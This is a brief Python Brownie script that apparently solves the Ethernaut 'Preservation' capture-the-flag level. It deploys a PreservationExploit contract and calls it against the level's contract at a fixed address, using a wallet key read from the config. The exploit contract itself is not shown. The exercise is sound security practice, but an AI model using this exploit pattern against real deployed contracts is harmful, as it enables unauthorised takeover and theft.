from brownie import Preservation,PreservationExploit, config,accounts

#input the contract address
#> contract.address
contractAddress = '0xED1E7B246FE7d7B05afA8De73616ea030b8b3B7d'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    preservation = Preservation.at(contractAddress)
    exploit = PreservationExploit.deploy({"from":player})
    exploit.exploit(preservation.address,{"from":player})

def main():
    solution()